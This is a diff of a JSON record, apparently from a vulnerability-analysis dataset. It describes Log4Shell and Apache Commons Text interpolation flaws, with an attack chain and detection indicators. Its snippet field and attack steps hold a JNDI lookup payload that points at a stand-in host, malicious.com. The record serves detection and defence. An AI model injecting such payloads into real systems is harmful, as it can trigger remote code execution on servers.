@@ -1,16 +1,16 @@
 {
   "package_info": {
-    "package_name": "log4j / spring-framework / commons-text",
-    "package_manager": "Maven (Java)",
-    "package_versions": "log4j: <2.17.1; spring-framework: 5.3.0-5.3.17, 5.2.0-5.2.19, older; commons-text: <1.10.0",
-    "why_malicious": "These packages contained vulnerabilities that allowed attackers to execute arbitrary code remotely (RCE) via unsafe string interpolation or class loader access, making them critical security risks. The vulnerabilities enable attackers to inject malicious payloads through crafted input, leading to system compromise."
+    "package_name": "log4j",
+    "package_manager": "Maven",
+    "package_versions": "2.0-beta9 through 2.14.1",
+    "why_malicious": "The affected versions of Log4j contain a critical vulnerability (Log4Shell) that allows attackers to trigger remote code execution by injecting specially crafted strings into log messages, which are then interpreted and executed via JNDI lookups. This enables attackers to execute arbitrary code on vulnerable systems, making the package as shipped in these versions highly dangerous."
   },
   "malicious_snippets": [
     {
       "snippet_id": "snippet_1",
       "execution_context": {
-        "trigger": "runtime (when user input is logged or interpolated)",
-        "file_location": "log4j core logging logic (e.g., PatternLayout, message formatting)",
+        "trigger": "runtime (when a log message is processed)",
+        "file_location": "Any Java file using Log4j logging methods (e.g., log.info(), log.error())",
         "required_permissions": [
           "network",
           "JNDI access",
@@ -18,16 +18,16 @@
         ]
       },
       "code_snippet": "${jndi:ldap://malicious.com/malwarepayload}",
-      "code_language": "java (string interpolation in log4j)",
-      "code_behavior": "Performs JNDI lookup using attacker-controlled LDAP URL, resulting in remote code execution if the LDAP server returns a malicious Java class.",
+      "code_language": "java (string processed by Log4j)",
+      "code_behavior": "At runtime, when a log message containing the string '${jndi:ldap://malicious.com/malwarepayload}' is processed, Log4j performs a JNDI lookup to the specified LDAP server, retrieves and executes remote code, resulting in arbitrary code execution on the vulnerable server.",
       "malice_analysis": {
-        "why_suspicious": "Allows untrusted input to trigger network lookups and load remote code via JNDI.",
-        "violated_expectations": "Logging libraries should not execute code or perform network lookups based on log message content.",
-        "similar_legitimate_use": "JNDI lookups are legitimate in enterprise Java, but not in log message formatting.",
+        "why_suspicious": "This behavior allows untrusted user input to trigger network requests and load/execute code from remote servers, which is a classic remote code execution vector.",
+        "violated_expectations": "Normal logging libraries should treat log messages as inert data, not as code or instructions to perform network lookups or execute remote code.",
+        "similar_legitimate_use": "JNDI lookups are legitimate in enterprise Java for resource discovery, but not in the context of processing untrusted log messages.",
         "key_indicators": [
-          "Use of ${jndi:...} in log messages",
-          "Network access triggered by log message content",
-          "Dynamic code loading from remote sources"
+          "Use of ${jndi:...} patterns in log messages",
+          "Automatic network requests triggered by log message content",
+          "Execution of code retrieved from remote servers"
         ]
       }
     },
@@ -35,48 +35,22 @@
       "snippet_id": "snippet_2",
       "execution_context": {
         "trigger": "runtime (when variable interpolation is performed)",
-        "file_location": "org.apache.commons.text.StringSubstitutor / StringLookup",
+        "file_location": "Any Java file using Apache Commons Text's StringSubstitutor or similar interpolation features",
         "required_permissions": [
           "network",
           "arbitrary code execution"
         ]
       },
       "code_snippet": "${prefix:name}",
-      "code_language": "java (string interpolation in commons-text)",
-      "code_behavior": "Performs variable interpolation using attacker-controlled prefix and name, which can trigger network lookups or code execution if a malicious Lookup implementation is used.",
+      "code_language": "java (string processed by Apache Commons Text)",
+      "code_behavior": "At runtime, when a string containing '${prefix:name}' is interpolated by Apache Commons Text, the library may resolve the prefix to a remote resource or perform a lookup that can result in remote code execution if the prefix is mapped to a dangerous lookup (e.g., script, url, dns, or jndi).",
       "malice_analysis": {
-        "why_suspicious": "Allows attacker-controlled input to trigger arbitrary lookups, potentially leading to RCE.",
-        "violated_expectations": "String interpolation should not allow execution of arbitrary code or network access.",
-        "similar_legitimate_use": "Variable interpolation is common, but should be restricted to safe, local values.",
+        "why_suspicious": "Allowing arbitrary prefixes in variable interpolation can enable attackers to trigger network requests or code execution by controlling the input string.",
+        "violated_expectations": "Variable interpolation should not allow untrusted input to trigger network lookups or code execution.",
+        "similar_legitimate_use": "Variable interpolation is common for configuration, but should be limited to safe, local lookups.",
         "key_indicators": [
-          "Unrestricted use of ${...} patterns in user-controlled input",
-          "Ability to specify custom lookup prefixes",
-          "Network or code execution side effects from string interpolation"
-        ]
-      }
-    },
-    {
-      "snippet_id": "snippet_3",
-      "execution_context": {
-        "trigger": "runtime (when application is deployed as WAR on Tomcat, JDK 9+)",
-        "file_location": "Spring Framework data binding logic (e.g., spring-beans, spring-webmvc)",
-        "required_permissions": [
-          "filesystem",
-          "class loader access",
-          "potential code execution"
-        ]
-      },
-      "code_snippet": "java.lang.Class.getModule()",
-      "code_language": "java",
-      "code_behavior": "Allows access to the class's module and class loader, which can be abused to manipulate the class loader and achieve remote code execution in certain Spring Framework versions.",
-      "malice_analysis": {
-        "why_suspicious": "Exposes internal class loader access via data binding, which can be exploited for RCE.",
-        "violated_expectations": "Frameworks should not expose class loader or module access via user-controllable properties.",
-        "similar_legitimate_use": "Reflection and module access are legitimate in advanced Java, but not via web request data binding.",
-        "key_indicators": [
-          "Exposure of getModule() via data binding",
-          "Ability to manipulate class loader from user input",
-          "RCE via crafted web requests in specific deployment scenarios"
+          "Unrestricted variable interpolation with user-controlled prefixes",
+          "Support for dangerous lookups (jndi, url, script) in input strings"
         ]
       }
     }
@@ -84,49 +58,47 @@
   "attack_chain": [
     {
       "step": 1,
-      "action": "Attacker sends crafted input (e.g., log message, web request, or interpolated string) containing a malicious payload.",
+      "action": "Attacker injects a specially crafted string (e.g., '${jndi:ldap://malicious.com/malwarepayload}') into any input that will be logged or interpolated.",
       "implemented_by": [
         "snippet_1",
-        "snippet_2",
-        "snippet_3"
+        "snippet_2"
       ],
-      "leads_to": "Triggering of vulnerable code paths in the affected library."
+      "leads_to": "Triggering of remote lookup by the vulnerable library"
     },
     {
       "step": 2,
-      "action": "Vulnerable library processes the input, performing unsafe interpolation or class loader access.",
+      "action": "The vulnerable library (Log4j or Apache Commons Text) processes the string, performs a JNDI or other remote lookup, and retrieves code or data from the attacker's server.",
       "implemented_by": [
         "snippet_1",
-        "snippet_2",
-        "snippet_3"
+        "snippet_2"
       ],
-      "leads_to": "Execution of network requests or code loading as dictated by attacker input."
+      "leads_to": "Remote code execution on the vulnerable system"
     },
     {
       "step": 3,
-      "action": "Remote code execution is achieved, allowing attacker to run arbitrary code on the server.",
+      "action": "Attacker gains arbitrary code execution, potentially taking full control of the affected system.",
       "implemented_by": [
         "snippet_1",
-        "snippet_2",
-        "snippet_3"
+        "snippet_2"
       ],
-      "leads_to": "System compromise, data exfiltration, or further lateral movement."
+      "leads_to": "System compromise and potential lateral movement"
     }
   ],
   "detection_knowledge": {
     "behavioral_signatures": [
-      "Unexpected network requests during string interpolation or logging",
-      "Use of ${jndi:...} or similar patterns in log messages or user input",
-      "Exposure of class loader or module access via web request data binding"
+      "Log messages or interpolated strings containing '${jndi:' or similar variable interpolation patterns",
+      "Unexpected outbound LDAP, RMI, or other JNDI-related network requests from application servers",
+      "Execution of code or loading of classes from remote servers triggered by log or configuration input"
     ],
     "file_indicators": [
-      "Presence of vulnerable log4j-core (<2.17.1), spring-beans (5.3.0-5.3.17, 5.2.0-5.2.19), or commons-text (<1.10.0) JARs",
-      "Application packaged as WAR and deployed on Tomcat (for Spring4Shell)"
+      "Presence of vulnerable Log4j versions (2.0-beta9 through 2.14.1) in dependency manifests (pom.xml, build.gradle, etc.)",
+      "Use of Apache Commons Text versions prior to 1.10.0",
+      "Log files or application logs containing suspicious interpolation patterns"
     ],
     "network_indicators": [
-      "Outbound LDAP, RMI, or HTTP requests to untrusted domains during log processing or string interpolation",
-      "Connections to attacker-controlled infrastructure triggered by application input"
+      "Outbound LDAP, RMI, or DNS requests to untrusted or unexpected domains",
+      "Connections to attacker-controlled infrastructure (e.g., malicious.com, webhook.site, etc.)"
     ],
-    "how_to_detect": "Monitor for use of vulnerable library versions, scan for suspicious ${jndi:...} or ${prefix:name} patterns in logs and user input, and alert on unexpected outbound network requests from application servers during log or string processing. Use static analysis to detect exposure of class loader or module access via data binding in Spring applications. Upgrade affected libraries to patched versions."
+    "how_to_detect": "Monitor application logs and network traffic for suspicious variable interpolation patterns such as '${jndi:' or '${prefix:'. Audit dependency manifests for vulnerable versions of Log4j and Apache Commons Text. Alert on unexpected outbound LDAP, RMI, or DNS requests from application servers, especially those triggered by log or configuration input. Use static analysis to identify code paths where untrusted input is passed to logging or interpolation functions."
   }
 }
